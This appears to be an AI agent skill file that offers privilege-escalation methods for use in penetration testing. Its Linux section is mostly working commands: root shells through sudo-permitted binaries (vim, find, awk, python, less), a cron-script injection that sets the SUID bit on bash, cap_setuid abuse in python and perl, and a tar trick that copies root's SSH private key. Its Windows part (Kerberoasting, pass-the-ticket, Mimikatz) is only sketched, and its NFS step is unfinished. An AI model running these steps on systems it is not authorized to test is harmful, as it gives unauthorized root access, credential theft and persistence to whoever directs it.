---
name: privilege-escalation-methods
description: Use this skill when you need to escalate privileges from a low-privileged user to root or administrator access on Linux or Windows systems, employing various techniques and tools for effective exploitation.
---

# Privilege Escalation Methods

## Purpose

Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. This skill is essential for penetration testing during the post-exploitation phase and red team operations.

## Inputs/Prerequisites

- Initial low-privilege shell access on the target system
- Kali Linux or a penetration testing distribution
- Tools: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus
- Understanding of Windows/Linux privilege models
- For Active Directory attacks: Domain user credentials and network access to the Domain Controller

## Outputs/Deliverables

- Root or Administrator shell access
- Extracted credentials and hashes
- Persistent access mechanisms
- Domain compromise (for Active Directory environments)

## Core Techniques

### Linux Privilege Escalation

#### 1. Abusing Sudo Binaries

Exploit misconfigured sudo permissions using GTFOBins techniques:

```bash
# Check sudo permissions
sudo -l

# Exploit common binaries
sudo vim -c ':!/bin/bash'
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/hosts    # then type: !bash
sudo man man            # then type: !bash
sudo env /bin/bash
```

#### 2. Abusing Scheduled Tasks (Cron)

```bash
# Find writable cron scripts
ls -la /etc/cron*
cat /etc/crontab

# Inject payload into writable script
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Wait for execution, then:
bash -p
```

#### 3. Abusing Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
tar -cvf key.tar /root/.ssh/id_rsa
tar -xvf key.tar
```

#### 4. NFS Root Squashing

```bash
# Check for NFS shares
showmount -e <victim_ip>

# Mount and exploit no_root_squash
```

### Windows Privilege Escalation

#### 1. Kerberoasting

- Extract service tickets for service accounts and crack them offline.

#### 2. Pass-the-Ticket

- Use stolen Kerberos tickets to access resources.

#### 3. Token Impersonation

- Use tools like Mimikatz to impersonate other users.

## Conclusion

This skill provides a structured approach to privilege escalation, ensuring that users can effectively identify and exploit vulnerabilities in both Linux and Windows environments.